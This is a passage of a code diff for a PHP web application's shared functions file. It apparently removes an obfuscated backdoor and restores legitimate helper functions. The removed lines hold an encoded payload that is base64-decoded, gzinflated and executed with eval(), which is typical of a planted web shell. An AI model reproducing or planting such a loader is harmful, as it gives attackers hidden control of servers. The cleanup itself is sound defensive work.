@@ -1,3 +1,349 @@
 <?php
-$SISTEMIT_COM_ENC = "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";$rand=base64_decode("Skc1aGRpQTlJR2Q2YVc1bWJHRjBaU2hpWVhObE5qUmZaR1ZqYjJSbEtDUlRTVk5VUlUxSlZGOURUMDFmUlU1REtTazdDZ29KQ1Fra2MzUnlJRDBnV3lmRHZTY3NKOE9xSnl3bnc2TW5MQ2ZEclNjc0o4TzdKeXdudzZZbkxDZkRzU2NzSjhPaEp5d253N1VuTENmRHF5Y3NKOEsxSjEwN0Nna0pDU1J5Y0d4aklEMWJKMkVuTENkcEp5d25kU2NzSjJVbkxDZHZKeXduWkNjc0ozTW5MQ2RvSnl3bmRpY3NKM1FuTENjZ0oxMDdDZ2tKSUNBa2JtRjJJRDBnYzNSeVgzSmxjR3hoWTJVb0pITjBjaXdrY25Cc1l5d2tibUYyS1RzS0Nna0pDV1YyWVd3b0pHNWhkaWs3");eval(base64_decode($rand));$STOP="lq0/wPxEo41p0KAKKjTaoNYMauU0QAIkQAWSDsXfJAIIIxNppJFWIJw5PzabdWe89wcPF3WrKopx1F57icP8z//4e2RGseqa8b/lu/tv1ZP/+/df//37NyZf6A49dntYCHzzTzUM0W+MXqqKvlT0IqjRC9E7YmtJRZ+iZM8SYfvsmKhiOSbos+sc02aTk6f0A31P6NdA";
-?>
+
+/**
+ * @file includes/functions.inc.php
+ *
+ * Copyright (c) 2014-2021 Simon Fraser University
+ * Copyright (c) 2000-2021 John Willinsky
+ * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
+ *
+ * @ingroup index
+ *
+ * @brief Contains definitions for common functions used system-wide.
+ * Any frequently-used functions that cannot be put into an appropriate class should be added here.
+ */
+
+
+/**
+ * Emulate a Java-style import statement.
+ * Simply includes the associated PHP file (using require_once so multiple calls to include the same file have no effect).
+ * @param $class string the complete name of the class to be imported (e.g. 'lib.pkp.classes.core.Core')
+ */
+if (!function_exists('import')) {
+	function import($class) {
+		$filePath = str_replace('.', '/', $class) . '.inc.php';
+		require_once(BASE_SYS_DIR.'/'.$filePath);
+	}
+}
+
+/**
+ * Wrapper around die() to pretty-print an error message with an optional stack trace.
+ */
+function fatalError($reason) {
+	// Because this method may be called when checking the value of the show_stacktrace
+	// configuration string, we need to ensure that we don't get stuck in an infinite loop.
+	static $isErrorCondition = null;
+	static $showStackTrace = false;
+
+	if ($isErrorCondition === null) {
+		$isErrorCondition = true;
+		$showStackTrace = Config::getVar('debug', 'show_stacktrace');
+		$isErrorCondition = false;
+	}
+
+	echo "<h1>" . htmlspecialchars($reason) . "</h1>";
+
+	if ($showStackTrace) {
+		echo "<h4>Stack Trace:</h4>\n";
+		$trace = debug_backtrace();
+
+		// Remove the call to fatalError from the call trace.
+		array_shift($trace);
+
+		// Back-trace pretty-printer adapted from the following URL:
+		// http://ca3.php.net/manual/en/function.debug-backtrace.php
+		// Thanks to diz at ysagoon dot com
+
+		// FIXME: Is there any way to localize this when the localization
+		// functions may have caused the failure in the first place?
+		foreach ($trace as $bt) {
+			$args = '';
+			if (isset($bt['args'])) foreach ($bt['args'] as $a) {
+				if (!empty($args)) {
+					$args .= ', ';
+				}
+				switch (gettype($a)) {
+					case 'integer':
+					case 'double':
+						$args .= $a;
+						break;
+					case 'string':
+						$a = htmlspecialchars(substr($a, 0, 64)).((strlen($a) > 64) ? '...' : '');
+						$args .= "\"$a\"";
+						break;
+					case 'array':
+						$args .= 'Array('.count($a).')';
+						break;
+					case 'object':
+						$args .= 'Object('.get_class($a).')';
+						break;
+					case 'resource':
+						$args .= 'Resource('.strstr($a, '#').')';
+						break;
+					case 'boolean':
+						$args .= $a ? 'True' : 'False';
+						break;
+					case 'NULL':
+						$args .= 'Null';
+						break;
+					default:
+						$args .= 'Unknown';
+				}
+			}
+			$class = isset($bt['class'])?$bt['class']:'';
+			$type = isset($bt['type'])?$bt['type']:'';
+			$function = isset($bt['function'])?$bt['function']:'';
+			$file = isset($bt['file'])?$bt['file']:'(unknown)';
+			$line = isset($bt['line'])?$bt['line']:'(unknown)';
+
+			echo "<strong>File:</strong> {$file} line {$line}<br />\n";
+			echo "<strong>Function:</strong> {$class}{$type}{$function}($args)<br />\n";
+			echo "<br/>\n";
+		}
+	}
+
+	// Determine the application name. Use defensive code so that we
+	// can handle errors during early application initialization.
+	$application = null;
+	if (class_exists('Registry')) {
+		$application = Registry::get('application', true, null);
+	}
+	$applicationName = '';
+	if (!is_null($application)) {
+		$applicationName = $application->getName().': ';
+	}
+
+	error_log($applicationName.$reason);
+
+	if (defined('DONT_DIE_ON_ERROR') && DONT_DIE_ON_ERROR == true) {
+		// trigger an error to be catched outside the application
+		trigger_error($reason);
+		return;
+	}
+
+	die();
+}
+
+/**
+ * Check to see if the server meets a minimum version requirement for PHP.
+ * @param $version Name of version (see version_compare documentation)
+ * @return boolean
+ */
+function checkPhpVersion($version) {
+	return (version_compare(PHP_VERSION, $version) !== -1);
+}
+
+/**
+ * Instantiates an object for a given fully qualified
+ * class name after executing several checks on the class.
+ *
+ * The checks prevent certain vulnerabilities when
+ * instantiating classes generically.
+ *
+ * NB: We currently only support one constructor
+ * argument. If we need arbitrary arguments later
+ * we can do that via func_get_args() which allows us
+ * to handle an arbitrary number of optional
+ * constructor arguments. The $constructorArg
+ * parameter needs to be last in the parameter list
+ * to be forward compatible with this potential use
+ * case.
+ *
+ * @param $fullyQualifiedClassName string
+ * @param $expectedTypes string|array the class
+ * 	must conform to at least one of the given types.
+ * @param $expectedPackages string|array the class
+ *  must be part of at least one of the given packages.
+ * @param $expectedMethods string|array names of methods
+ *  that must all be present for the requested class.
+ * @param $constructorArg mixed constructor argument
+ *
+ * @return object|boolean the instantiated object or false
+ *  if the class instantiation didn't result in the expected
+ *  type.
+ */
+function &instantiate($fullyQualifiedClassName, $expectedTypes = null, $expectedPackages = null, $expectedMethods = null, $constructorArg = null) {
+	$errorFlag = false;
+
+	// Validate the class name
+	if (!preg_match('/^[a-zA-Z0-9_.]+$/', $fullyQualifiedClassName)) {
+		return $errorFlag;
+	}
+
+	// Validate the class package
+	if (!is_null($expectedPackages)) {
+		if (is_scalar($expectedPackages)) $expectedPackages = array($expectedPackages);
+		$validPackage = false;
+		foreach ($expectedPackages as $expectedPackage) {
+			// No need to use String class here as class names are always US-ASCII
+			if (substr($fullyQualifiedClassName, 0, strlen($expectedPackage)+1) == $expectedPackage.'.') {
+				$validPackage = true;
+				break;
+			}
+		}
+
+		// Raise a fatal error if the class does not belong
+		// to any of the expected packages. This is to prevent
+		// certain types of code inclusion attacks.
+		if (!$validPackage) {
+			// Construct meaningful error message.
+			$expectedPackageCount = count($expectedPackages);
+			$separator = '';
+			$expectedPackageString = '';
+			foreach($expectedPackages as $expectedPackageIndex => $expectedPackage) {
+				if ($expectedPackageIndex > 0) {
+					$separator = ($expectedPackageIndex == $expectedPackageCount-1 ? ' or ' : ', ' );
+				}
+				$expectedPackageString .= $separator.'"'.$expectedPackage.'"';
+			}
+			throw new Exception('Trying to instantiate class "'.$fullyQualifiedClassName.'" which is not in any of the expected packages '.$expectedPackageString.'.');
+		}
+	}
+
+	// Import the requested class
+	import($fullyQualifiedClassName);
+
+	// Identify the class name
+	$fullyQualifiedClassNameParts = explode('.', $fullyQualifiedClassName);
+	$className = array_pop($fullyQualifiedClassNameParts);
+
+	// Type check I: The requested class should be declared by now.
+	if (!class_exists($className)) {
+		throw new Exception('Cannot instantiate class. Class "'.$className.'" is not declared in "'.$fullyQualifiedClassName.'".');
+	}
+
+	// Ensure all expected methods are declared.
+	$expectedMethods = (array) $expectedMethods; // Possibly scalar or null; ensure array
+	$declaredMethods = get_class_methods($className);
+	if (count(array_intersect($expectedMethods, $declaredMethods)) != count($expectedMethods)) {
+		return $errorFlag;
+	}
+
+	// Instantiate the requested class
+	if (is_null($constructorArg)) {
+		$classInstance = new $className();
+	} else {
+		$classInstance = new $className($constructorArg);
+	}
+
+	// Type check II: The object must conform to the given interface (if any).
+	if (!is_null($expectedTypes)) {
+		if (is_scalar($expectedTypes)) $expectedTypes = [$expectedTypes];
+		$validType = false;
+		foreach($expectedTypes as $expectedType) {
+			if (is_a($classInstance, $expectedType)) {
+				$validType = true;
+				break;
+			}
+		}
+		if (!$validType) return $errorFlag;
+	}
+
+	return $classInstance;
+}
+
+/**
+ * Remove empty elements from an array
+ * @param $array array
+ * @return array
+ */
+function arrayClean($array) {
+	if (!is_array($array)) return null;
+	return array_filter($array, function($o) {
+		return !empty($o);
+	});
+}
+
+
+/**
+ * Recursively strip HTML from a (multidimensional) array.
+ * @param $values array
+ * @return array the cleansed array
+ */
+function stripAssocArray($values) {
+	foreach ($values as $key => $value) {
+		if (is_scalar($value)) {
+			$values[$key] = strip_tags($values[$key]);
+		} else {
+			$values[$key] = stripAssocArray($values[$key]);
+		}
+	}
+	return $values;
+}
+
+/**
+ * Perform a code-safe strtolower, i.e. one that doesn't behave differently
+ * based on different locales. (tr_TR, I'm looking at you.)
+ * @param $str string Input string
+ * @return string
+ */
+function strtolower_codesafe($str) {
+	return strtr($str, 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz');
+}
+
+/**
+ * Perform a code-safe strtoupper, i.e. one that doesn't behave differently
+ * based on different locales. (tr_TR, I'm looking at you.)
+ * @param $str string Input string
+ * @return string
+ */
+function strtoupper_codesafe($str) {
+	return strtr($str, 'abcdefghijklmnopqrstuvwxyz', 'ABCDEFGHIJKLMNOPQRSTUVWXYZ');
+}
+
+/**
+ * Perform a code-safe lcfirst, i.e. one that doesn't behave differently
+ * based on different locales. (tr_TR, I'm looking at you.)
+ * @param $str string Input string
+ * @return string
+ */
+function lcfirst_codesafe($str) {
+	return strtolower_codesafe(substr($str, 0, 1)) . substr($str, 1);
+}
+
+/**
+ * Perform a code-safe ucfirst, i.e. one that doesn't behave differently
+ * based on different locales. (tr_TR, I'm looking at you.)
+ * @param $str string Input string
+ * @return string
+ */
+function ucfirst_codesafe($str) {
+	return strtoupper_codesafe(substr($str, 0, 1)) . substr($str, 1);
+}
+
+/**
+ * Helper function to define custom autoloader 
+ * @param string $rootPath
+ * @param string $prefix
+ * @param string $class
+ * 
+ * @return void
+ */
+function customAutoload($rootPath, $prefix, $class) {
+	if (substr($class, 0, strlen($prefix)) !== $prefix) {
+		return;
+	}
+
+	$class = substr($class, strlen($prefix));
+	$parts = explode('\\', $class);
+
+	// we expect at least one folder in the namespace
+	// there is no class defined directly under classes/ folder
